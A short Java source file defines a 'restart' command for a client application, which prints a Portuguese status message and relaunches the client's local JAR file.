package br.com.introcdc.connect.client.commands.info;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 16:09
 */

import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.ClientInstallComponents;

public class ClientCommandRestart extends ClientCommand {

    public ClientCommandRestart() {
        super("restart");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        msg("Reiniciando cliente...");
        ClientInstallComponents.runJar(ClientInstallComponents.LOCAL_FILE, null);
    }

}
